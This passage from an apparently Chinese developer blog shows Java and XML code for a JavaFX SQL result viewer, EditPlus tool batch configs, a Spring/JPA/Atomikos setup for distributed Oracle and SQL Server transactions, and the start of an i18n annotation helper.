&quot;yy&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private static void initCAS() throws SQLException &#123;</span><br><span class="line">    conn = DriverManager.getConnection(zzUrl, &quot;zz&quot;, &quot;zz&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void test() throws Exception &#123;</span><br><span class="line">    String[] args = new String[] &#123; &quot;xx&quot;,</span><br><span class="line">        &quot;select * from xxTable&quot; &#125;;</span><br><span class="line">    launch(args);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    launch(args);</span><br><span class="line">    // test();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="QueryVisual-java-用于在GUI上显示结果"><a href="#QueryVisual-java-用于在GUI上显示结果" class="headerlink" title="QueryVisual.java, 用于在GUI上显示结果"></a>QueryVisual.java, 用于在GUI上显示结果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">package forest;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">import javafx.application.Application;</span><br><span class="line">import javafx.collections.FXCollections;</span><br><span class="line">import javafx.event.EventHandler;</span><br><span class="line">import javafx.geometry.Insets;</span><br><span class="line">import javafx.scene.Group;</span><br><span class="line">import javafx.scene.Scene;</span><br><span class="line">import javafx.scene.control.Label;</span><br><span class="line">import javafx.scene.control.ScrollPane;</span><br><span class="line">import javafx.scene.control.TableColumn;</span><br><span class="line">import javafx.scene.control.TableView;</span><br><span class="line">import javafx.scene.control.ScrollPane.ScrollBarPolicy;</span><br><span class="line">import javafx.scene.input.KeyCode;</span><br><span class="line">import javafx.scene.input.KeyEvent;</span><br><span class="line">import javafx.scene.layout.VBox;</span><br><span class="line">import javafx.scene.text.Font;</span><br><span class="line">import javafx.stage.Stage;</span><br><span class="line">import javafx.util.Callback;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.beanutils.BasicDynaBean;</span><br><span class="line">import org.apache.commons.beanutils.DynaBean;</span><br><span class="line"></span><br><span class="line">public class QueryVisual extends Application implements EventHandler&lt;KeyEvent&gt; &#123;</span><br><span class="line">  private TableView&lt;DynaBean&gt; table = new TableView&lt;DynaBean&gt;();</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    Query.launch(args);</span><br><span class="line">    launch(args);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public void start(Stage stage) throws Exception &#123;</span><br><span class="line">    Scene scene = new Scene(new Group());</span><br><span class="line">    stage.setTitle(&quot;Result View&quot;);</span><br><span class="line"></span><br><span class="line">    final Label label = new Label(&quot;SQL Result&quot;);</span><br><span class="line">    label.setFont(new Font(&quot;Arial&quot;, 20));</span><br><span class="line"></span><br><span class="line">    table.setStyle(&quot;-fx-base: #b6e7c9;&quot;);</span><br><span class="line"></span><br><span class="line">    final List&lt;String&gt; cols = Query.getColumnNames();</span><br><span class="line">    List&lt;DynaBean&gt; rows = Query.getBeans();</span><br><span class="line">    for (final String col : cols) &#123;</span><br><span class="line">      TableColumn&lt;String&gt; nameCol = new TableColumn&lt;String&gt;(col);</span><br><span class="line">      nameCol</span><br><span class="line">          .setDataRetriever(new Callback&lt;TableColumn.CellDataFeatures&lt;String&gt;, String&gt;() &#123;</span><br><span class="line">            public String call(</span><br><span class="line">                TableColumn.CellDataFeatures&lt;String&gt; p) &#123;</span><br><span class="line">              return (String) ((BasicDynaBean) p.getValue())</span><br><span class="line">                  .get(col.toLowerCase());</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">      table.getColumns().add(nameCol);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    table.setItems(FXCollections.observableArrayList(rows));</span><br><span class="line">    table.setPrefHeight(380);</span><br><span class="line">    table.setPrefWidth(600);</span><br><span class="line">    final VBox vbox = new VBox();</span><br><span class="line">    vbox.setSpacing(5);</span><br><span class="line">    vbox.getChildren().addAll(label, table);</span><br><span class="line">    vbox.setPadding(new Insets(10, 0, 0, 10));</span><br><span class="line">    ScrollPane sp = new ScrollPane();</span><br><span class="line">    sp.setHbarPolicy(ScrollBarPolicy.ALWAYS);</span><br><span class="line">    sp.setVbarPolicy(ScrollBarPolicy.ALWAYS);</span><br><span class="line"></span><br><span class="line">    sp.setPrefHeight(400);</span><br><span class="line">    sp.setPrefWidth(760);</span><br><span class="line"></span><br><span class="line">    sp.setNode(vbox);</span><br><span class="line"></span><br><span class="line">    sp.setOnKeyReleased(this);</span><br><span class="line">    scene.setOnKeyReleased(this);</span><br><span class="line"></span><br><span class="line">    ((Group) scene.getRoot()).getChildren().add(sp);</span><br><span class="line">    stage.setScene(scene);</span><br><span class="line">    stage.setVisible(true);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public void handle(KeyEvent event) &#123;</span><br><span class="line">    if (event.getCode().equals(KeyCode.ESCAPE))</span><br><span class="line">      System.exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="EditPlus的用户工具配置"><a href="#EditPlus的用户工具配置" class="headerlink" title="EditPlus的用户工具配置"></a>EditPlus的用户工具配置</h2><h3 id="tool-ui-ini"><a href="#tool-ui-ini" class="headerlink" title="tool_ui.ini"></a>tool_ui.ini</h3><p>控制台显示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Text=run SQL in Console</span><br><span class="line">Command=C:\Users\user\Desktop\Forest\command\run SQL.bat</span><br><span class="line">Argument=$(Prompt) &quot;$(CurSel)&quot;</span><br><span class="line">InitDir=$(FileDir)</span><br></pre></td></tr></table></figure>
<p>run SQL.bat<br><code>&quot;C:\Program Files\Java\jre7\bin\java.exe&quot; -cp .;&quot;C:\Users\user\workspace\SQL Query\bin&quot;;C:\Users\user\workspace\common-lib\ojdbc14.jar;C:\Users\user\workspace\common-lib\sqljdbc4.jar;C:/Users/user/Desktop/Forest/spring-framework-2.5.6/lib/jakarta-commons/commons-beanutils.jar;C:/Users/user/Desktop/Forest/spring-framework-2.5.6/lib/jakarta-commons/commons-lang.jar forest.Query %1 %2</code></p>
<p>GUI显示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Text=run SQL in GUI</span><br><span class="line">Command=C:\Users\user\Desktop\Forest\command\javafx.bat</span><br><span class="line">Argument=$(Prompt) &quot;$(CurSel)&quot;</span><br><span class="line">InitDir=$(FileDir)</span><br></pre></td></tr></table></figure>
<p>javafx.bat<br><code>&quot;C:\Program Files\Java\jre7\bin\java.exe&quot; -cp C:\Users\user\Downloads\javafx-sdk2.0-beta\rt\lib\jfxrt.jar;.;&quot;C:\Users\user\workspace\SQL Query\bin&quot;;C:\Users\user\workspace\common-lib\ojdbc14.jar;C:\Users\user\workspace\common-lib\sqljdbc4.jar;C:/Users/user/Desktop/Forest/spring-framework-2.5.6/lib/jakarta-commons/commons-beanutils.jar;C:/Users/user/Desktop/Forest/spring-framework-2.5.6/lib/jakarta-commons/commons-lang.jar forest.QueryVisual %1 &quot;gui&quot; %2</code></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Spring-+-JPA-+-atomikos实现Oracle-+-SQL-Server" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-07-29T08:41:47.000Z"><a href="/2011/07/29/Spring-+-JPA-+-atomikos%E5%AE%9E%E7%8E%B0Oracle-+-SQL-Server/">2011-07-29</a></time>
      
      
  
    <h1 class="title"><a href="/2011/07/29/Spring-+-JPA-+-atomikos%E5%AE%9E%E7%8E%B0Oracle-+-SQL-Server/">Spring + JPA + atomikos实现Oracle + SQL Server</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="persistence-xml"><a href="#persistence-xml" class="headerlink" title="persistence.xml"></a>persistence.xml</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;persistence version=&quot;1.0&quot;</span><br><span class="line">	xmlns=&quot;http://java.sun.com/xml/ns/persistence&quot;</span><br><span class="line">	xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">	xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_1_0.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;persistence-unit name=&quot;orcaleXA&quot; transaction-type=&quot;JTA&quot;&gt;</span><br><span class="line">		&lt;provider&gt;org.hibernate.ejb.HibernatePersistence&lt;/provider&gt;</span><br><span class="line">		&lt;properties&gt;</span><br><span class="line">			&lt;property name=&quot;hibernate.dialect&quot;</span><br><span class="line">				value=&quot;org.hibernate.dialect.Oracle10gDialect&quot; /&gt;</span><br><span class="line">			&lt;property name=&quot;hibernate.connection.driver_class&quot;</span><br><span class="line">				value=&quot;oracle.jdbc.xa.client.OracleXADataSource&quot; /&gt;</span><br><span class="line">			&lt;property name=&quot;hibernate.connection.url&quot;</span><br><span class="line">				value=&quot;jdbc:oracle:thin:name/password@192.168.201.215:1521:XE&quot; /&gt;</span><br><span class="line">			&lt;property name=&quot;hibernate.show_sql&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">			&lt;!-- property name=&quot;hibernate.transaction.factory_class&quot; </span><br><span class="line">				value=&quot;com.atomikos.icatch.jta.hibernate3.AtomikosJTATransactionFactory&quot; /--&gt;</span><br><span class="line">			&lt;property name=&quot;hibernate.transaction.manager_lookup_class&quot;</span><br><span class="line">				value=&quot;com.atomikos.icatch.jta.hibernate3.TransactionManagerLookup&quot; /&gt;</span><br><span class="line">		&lt;/properties&gt;</span><br><span class="line">	&lt;/persistence-unit&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;persistence-unit name=&quot;sqlServerXA&quot; transaction-type=&quot;JTA&quot;&gt;</span><br><span class="line">		&lt;provider&gt;org.hibernate.ejb.HibernatePersistence&lt;/provider&gt;</span><br><span class="line">		&lt;properties&gt;</span><br><span class="line">			&lt;property name=&quot;hibernate.dialect&quot;</span><br><span class="line">				value=&quot;org.hibernate.dialect.SQLServerDialect&quot; /&gt;</span><br><span class="line">			&lt;property name=&quot;hibernate.transaction.manager_lookup_class&quot;</span><br><span class="line">				value=&quot;com.atomikos.icatch.jta.hibernate3.TransactionManagerLookup&quot; /&gt;</span><br><span class="line">			&lt;property name=&quot;hibernate.show_sql&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">		&lt;/properties&gt;</span><br><span class="line">	&lt;/persistence-unit&gt;</span><br><span class="line">&lt;/persistence&gt;</span><br></pre></td></tr></table></figure>
<p> atomikos文档上说不用设置hibernate.transaction.factory_class，另外发现在WAS配置Hibernate JPA也应该不要设置hibernate.transaction.factory_class。</p>
<h1 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">  xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">  xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;</span><br><span class="line">    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-2.5.xsd</span><br><span class="line">    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.5.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;context:component-scan base-package=&quot;xx.yy.mypackage&quot; /&gt;</span><br><span class="line">  &lt;context:annotation-config /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;dataSource&quot;</span><br><span class="line">    class=&quot;com.atomikos.jdbc.AtomikosDataSourceBean&quot; init-method=&quot;init&quot; destroy-method=&quot;close&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;uniqueResourceName&quot;&gt;</span><br><span class="line">      &lt;value&gt;XADBMS&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;xaDataSourceClassName&quot;&gt;</span><br><span class="line">      &lt;value&gt;com.microsoft.sqlserver.jdbc.SQLServerXADataSource&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;xaProperties&quot;&gt;</span><br><span class="line">      &lt;props&gt;</span><br><span class="line">        &lt;prop key=&quot;user&quot;&gt;sa&lt;/prop&gt;</span><br><span class="line">        &lt;prop key=&quot;password&quot;&gt;Passw0rd&lt;/prop&gt;</span><br><span class="line">        &lt;prop key=&quot;serverName&quot;&gt;192.168.201.214&lt;/prop&gt;</span><br><span class="line">        &lt;prop key=&quot;databaseName&quot;&gt;myDataBase&lt;/prop&gt;</span><br><span class="line">      &lt;/props&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;poolSize&quot;&gt;</span><br><span class="line">      &lt;value&gt;1&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;orcaleXAEntityManagerFactory&quot;</span><br><span class="line">    class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;persistenceXmlLocation&quot;</span><br><span class="line">      value=&quot;/META-INF/persistence.xml&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;persistenceUnitName&quot; value=&quot;orcaleXA&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;sqlServerXAEntityManagerFactory&quot;</span><br><span class="line">    class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;persistenceXmlLocation&quot;</span><br><span class="line">      value=&quot;/META-INF/persistence.xml&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;persistenceUnitName&quot; value=&quot;sqlServerXA&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- bean id=&quot;transactionManager&quot;</span><br><span class="line">  class=&quot;org.springframework.orm.jpa.JpaTransactionManager&quot;&gt;</span><br><span class="line">  &lt;property name=&quot;entityManagerFactory&quot; ref=&quot;emf&quot; /&gt;</span><br><span class="line">  &lt;/bean--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;AtomikosTransactionManager&quot;</span><br><span class="line">    class=&quot;com.atomikos.icatch.jta.UserTransactionManager&quot;</span><br><span class="line">    init-method=&quot;init&quot; destroy-method=&quot;close&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;forceShutdown&quot; value=&quot;false&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;AtomikosUserTransaction&quot;</span><br><span class="line">    class=&quot;com.atomikos.icatch.jta.UserTransactionImp&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;transactionTimeout&quot; value=&quot;300&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;bean id=&quot;transactionManager&quot;</span><br><span class="line">    class=&quot;org.springframework.transaction.jta.JtaTransactionManager&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;transactionManager&quot;</span><br><span class="line">      ref=&quot;AtomikosTransactionManager&quot; /&gt;</span><br><span class="line">    &lt;property name=&quot;userTransaction&quot; ref=&quot;AtomikosUserTransaction&quot; /&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">  &lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt;</span><br><span class="line">    &lt;tx:attributes&gt;</span><br><span class="line">      &lt;tx:method name=&quot;get*&quot; read-only=&quot;true&quot; /&gt;</span><br><span class="line">      &lt;tx:method name=&quot;find&quot; read-only=&quot;true&quot; /&gt;</span><br><span class="line">      &lt;tx:method name=&quot;check&quot; read-only=&quot;true&quot; /&gt;</span><br><span class="line">      &lt;tx:method name=&quot;*&quot; read-only=&quot;false&quot; /&gt;</span><br><span class="line">    &lt;/tx:attributes&gt;</span><br><span class="line">  &lt;/tx:advice&gt;</span><br><span class="line"></span><br><span class="line">  &lt;aop:config&gt;</span><br><span class="line">    &lt;aop:pointcut id=&quot;txPointcut&quot;</span><br><span class="line">      expression=&quot;execution(public * xx.yy.mypacke..*Service.*(..))&quot; /&gt;</span><br><span class="line">    &lt;aop:advisor advice-ref=&quot;txAdvice&quot;</span><br><span class="line">      pointcut-ref=&quot;txPointcut&quot; /&gt;</span><br><span class="line">  &lt;/aop:config&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">  public class XxService &#123;</span><br><span class="line">    @PersistenceContext(unitName = &quot;orcaleXA&quot;)</span><br><span class="line">    private EntityManager oracleXaEm;</span><br><span class="line"></span><br><span class="line">    @PersistenceContext(unitName = &quot;sqlServerXA&quot;)</span><br><span class="line">    private EntityManager sqlServerXaEm;</span><br><span class="line">    public void run()&#123;</span><br><span class="line">      oracleXaEm.createQuery(&quot;...&quot;);</span><br><span class="line">      sqlServerXaEm.createQuery(&quot;...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @ContextConfiguration(locations = &quot;/applicationContext.xml&quot;)</span><br><span class="line">  public class TestXA extends AbstractJUnit38SpringContextTests &#123;</span><br><span class="line">    @Autowired</span><br><span class="line">    private XxService xxService;</span><br><span class="line"></span><br><span class="line">    public void testRun() &#123;</span><br><span class="line">      System.out.println(&quot;&lt;&lt;&quot;);</span><br><span class="line">      myService.go();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="lib"><a href="#lib" class="headerlink" title="lib:"></a>lib:</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">atomikos-util.jar </span><br><span class="line">transactions-jta.jar </span><br><span class="line">transactions-api.jar </span><br><span class="line">transactions.jar </span><br><span class="line">transactions-hibernate3.jar </span><br><span class="line">transactions-jdbc.jar </span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-简易I18n转换Engine" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-07-29T02:04:57.000Z"><a href="/2011/07/29/%E7%AE%80%E6%98%93I18n%E8%BD%AC%E6%8D%A2Engine/">2011-07-29</a></time>
      
      
  
    <h1 class="title"><a href="/2011/07/29/%E7%AE%80%E6%98%93I18n%E8%BD%AC%E6%8D%A2Engine/">简易I18n转换Engine</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>  分三部分： </p>
<ol>
<li>I18nFiled </li>
<li>在Entity里面指定i18n字段 </li>
<li>调用convertI18n(xEntity).getI18nShortDesc()</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.annotation.ElementType;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.RetentionPolicy;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line">@Target( &#123; ElementType.METHOD, ElementType.FIELD &#125;)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">public @interface I18nFiled &#123;</span><br><span class="line">  String en();</span><br><span class="line"></span><br><span class="line">  String sc();</span><br><span class="line"></span><br><span class="line">  String tc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class XEntity implements Serializable &#123;</span><br><span class="line">	@Transient</span><br><span class="line">	@I18nFiled(en = &quot;shortDescEn&quot;, sc = &quot;shortDescSc&quot;, tc = &quot;shortDescTc&quot;)</span><br><span class="line">	private String i18nShortDesc;</span><br><span class="line"></span><br><span class="line">	public String getI18nShortDesc() &#123;</span><br><span class="line">		return i18nShortDesc;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setI18nShortDesc(String shortDesc) &#123;</span><br><span class="line">		i18nShortDesc = shortDesc;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  AUser的默认语言是英文，BUser的默认语言是繁体中文 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 